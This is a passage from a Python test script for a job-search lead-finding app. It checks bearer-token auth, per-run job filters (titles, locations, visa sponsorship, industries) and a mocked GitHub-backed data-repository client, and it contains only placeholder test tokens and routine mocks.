# per-user session token above -- the two layers are independent, see CLAUDE.md "Multi-user" section)
main.API_TOKEN = "s3cret-token"
assert c.get("/health").status_code == 200 and c.get("/").json()["auth"] is True
assert c.get("/leads", headers=AUTH).status_code == 401                                   # bearer missing
assert c.get("/leads", headers={**AUTH, "Authorization": "Bearer wrong"}).status_code == 401
assert c.post("/export/sheets", json={}).status_code == 401
assert c.get("/leads", headers={**AUTH, "Authorization": "Bearer s3cret-token"}).status_code == 200
assert c.options("/leads", headers={"Origin": "http://localhost", "Access-Control-Request-Method": "GET"}).status_code == 200
main.API_TOKEN = ""
assert c.get("/health").headers["x-content-type-options"] == "nosniff"
print("SECURITY: validation, upload limits, no error leaks, run lock, background jobs, auth OK")

# ── in-app filters: any user overrides the profile per run (titles, places, visa need, industries, exclusions) ──
G = lambda job, f, hrs=24: rules_service.apply_gate(dict(job), rules_service.apply_filters(rules_service.load_rules(), f), hrs)["gate"]
de = J("Senior Data Engineer", "Globex", "Denver, CO", today, "spark")
assert G(de, None) == "title"                                            # example profile = PM family
assert G(de, {"titles": ["Data Engineer"], "locations": ["Denver, CO"]}) == "pass"
assert G(J("Product Manager", "Globex", "Denver, CO", today), {"titles": ["Data Engineer"]}) == "title"  # role family dropped
assert G(J("Sales Engineer", "Globex", "Denver, CO", today), {"titles": ["Sales Engineer"], "locations": ["Denver, CO"]}) == "pass"   # profile's "sales" exclusion dropped
# locations -> geography: city, full state name, ", ST" abbreviation; never words like "or"/"in"
OH = {"locations": ["Columbus, OH"], "remote_ok": False}
for loc, ok in [("Columbus, OH", True), ("Dublin, Ohio", True), ("Cleveland, OH, United States", True),
                ("Austin, TX", False), ("Portland, OR", False), ("Remote", False), ("United States", True)]:
    assert (G(J("Product Manager", "Globex", loc, today), OH) == "pass") == ok, loc
assert G(J("Product Manager", "Globex", "Remote", today, remote=True), dict(OH, remote_ok=True)) == "pass"
assert G(J("Product Manager", "Globex", "Portland, OR", today), {"locations": ["Portland, OR"]}) == "pass"
assert G(J("Product Manager", "Globex", "Boise, ID", today), {"locations": [], "remote_ok": False}) == "pass"  # no places = anywhere
# visa need: none / new sponsorship / already on H-1B (transfer)
xfer = J("Product Manager", "Globex", "Austin, TX", today, "We cannot sponsor new visas; H-1B transfers are considered.")
nosp = J("Product Manager", "Globex", "Austin, TX", today, "We are unable to sponsor visas for this role.")
unv = J("Product Manager", "Brandnew Gizmos", "Austin, TX", today, "payments")
assert G(xfer, {"visa": "new_sponsorship"}) == "posting_no_sponsorship" and G(xfer, {"visa": "h1b_transfer"}) == "pass"
assert G(nosp, {"visa": "h1b_transfer"}) == "posting_no_sponsorship" and G(nosp, {"visa": "none"}) == "pass"
assert G(unv, {"visa": "new_sponsorship"}) == "company_unverified"
assert G(unv, {"visa": "new_sponsorship", "sponsors_only": False}) == "pass"   # unknown sponsors allowed, still scored lower
assert G(unv, {"visa": "none"}) == "pass"
assert G(J("Product Manager", "Hooli", "Austin, TX", today), {"visa": "none"}) == "pass"
assert G(J("Product Manager", "Globex", "Austin, TX", today), {"exclude_companies": ["Globex"]}) == "company_excluded"
# industries -> score tiers in the order given
ir = rules_service.apply_filters(rules_service.load_rules(), {"industries": ["climate", "logistics"]})
assert score_lead(rules_service.apply_gate(J("Product Manager", "Globex", "Austin, TX", today, "climate tech"), ir, 24), ir)["score_parts"]["industry"] == 15
assert score_lead(rules_service.apply_gate(J("Product Manager", "Globex", "Austin, TX", today, "logistics"), ir, 24), ir)["score_parts"]["industry"] == 13
# Workday/ATS search phrases come from the titles, not a hardcoded role
assert set(rules_service.search_queries(rules_service.load_rules())) == {"product manager", "product owner", "program manager"}
assert rules_service.search_queries(rules_service.apply_filters(rules_service.load_rules(), {"titles": ["Senior Data Engineer", "Data Engineer", "ML Engineer"]})) == ["ml engineer", "data engineer"]
free_sources.requests.request = lambda m, url, **k: WR(LIST if m == "POST" else {"jobPostingInfo": DET[url[url.index("/job/"):]]})
assert {j["title"] for j in free_sources.fetch_company_board("acme", "workday", "acme.wd1/Careers", ["sales engineer"])} == {"Sales Engineer"}
free_sources.requests.request = _rq
# profile defaults never mutate between runs (each run gets a fresh copy)
assert rules_service.load_rules()["visa"]["mode"] == "new_sponsorship"
# API: defaults for the UI, filters on a run, validation (flt has no saved profile -> file default)
pf = c.get("/profile/filters", headers=AUTH_FLT).json()
assert pf["visa"] == "new_sponsorship" and pf["titles"] and pf["locations"] == ["Austin, TX"], pf
assert c.post("/agent/run", json={"filters": {"visa": "none", "titles": ["Product Manager"]}}, headers=AUTH_FLT).status_code == 200
assert c.post("/agent/run", json={"filters": {"visa": "green card"}}, headers=AUTH_FLT).status_code == 422
assert c.post("/agent/run", json={"filters": {"titles": ["x" * 81]}}, headers=AUTH_FLT).status_code == 422
assert c.post("/agent/run", json={"filters": {"locations": ["a"] * 9}}, headers=AUTH_FLT).status_code == 422
main.API_TOKEN = "s3cret-token"
assert c.get("/profile/filters", headers=AUTH_FLT).status_code == 401
main.API_TOKEN = ""
print("FILTERS: titles, locations, visa none/new/transfer, sponsors-only, industries, exclusions, API OK")

# ── data_repo: optional private-repo persistence/trigger client (see CLAUDE.md "Multi-user") ──
# Unconfigured by default -- local dev and this whole test suite need no GitHub credentials.
import data_repo, base64, requests as _requests
assert data_repo.enabled() is False
assert data_repo.fetch_user_leads("anyone") == []
assert data_repo.trigger_run("anyone", {})["ok"] is False
assert data_repo.find_run_after(_t.time(), timeout_s=0) is None
assert data_repo.run_status(1) is None

data_repo.DATA_REPO_TOKEN, data_repo.DATA_REPO = "tok", "owner/jobfinder-data"
assert data_repo.enabled() is True

class _FakeResp:
    def __init__(self, status_code=200, json_data=None, text=""):
        self.status_code, self._json, self.text = status_code, json_data or {}, text
    def raise_for_status(self):
        if self.status_code >= 400:
            raise RuntimeError(f"http {self.status_code}")
    def json(self):
        return self._json

_dispatch_calls = []
def _fake_get(url, headers=None, params=None, timeout=None):
    if "/contents/data/" in url and url.endswith("/leads.json"):
        content = base64.b64encode(json.dumps([{"url": "https://x/1"}]).encode()).decode()
        return _FakeResp(200, {"content": content})
    if "/contents/data/" in url and url.endswith("/missing.json"):
        return _FakeResp(404)
    if url.endswith("/runs"):
        now_z = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
        return _FakeResp(200, {"workflow_runs": [{"id": 42, "created_at": now_z}]})
    if "/actions/runs/42" in url:
        return _FakeResp(200, {"status": "completed", "conclusion": "success"})
    return _FakeResp(404)
def _fake_post(url, headers=None, json=None, timeout=None):
    _dispatch_calls.append((url, json))
    return _FakeResp(204)

_real_get, _real_post = _requests.get, _requests.post
_requests.get, _requests.post = _fake_get, _fake_post
try:
    assert data_repo.fetch_user_json("u1", "leads.json") == [{"url": "https://x/1"}]
    assert data_repo.fetch_user_json("u1", "missing.json") is None
    d = data_repo.trigger_run("u1", {"profile": {}}, "resume", 40, 24)
    assert d["ok"] is True and _dispatch_calls[-1][1]["inputs"]["user_id"] == "u1"
    run = data_repo.find_run_after(_t.time() - 2, timeout_s=3)
    assert run and run["id"] == 42
    assert data_repo.run_status(42) == {"status": "completed", "conclusion": "success"}

    # /agent/start + /agent/jobs poll the remote path end-to-end when data_repo is "enabled"
    jid2 = c.post("/agent/start", json={}, headers=AUTH).json()["job_id"]
    assert jid2.startswith("remote:")
    for _ in range(20):
        st2 = c.get(f"/agent/jobs/{jid2}", headers=AUTH).json()
        if st2["status"] != "running":
            break
        _t.sleep(0.1)
    assert st2["status"] == "done" and st2["result"]["leads"] == [{"url": "https://x/1"}], st2
finally:
    _requests.get, _requests.post = _real_get, _real_post
    data_repo.DATA_REPO_TOKEN, data_repo.DATA_REPO = "", ""
assert data_repo.enabled() is False
print("DATA_REPO: contents fetch, dispatch, run lookup/status, /agent/start remote path mocked OK (no real GitHub calls)")

print("ALL OK")
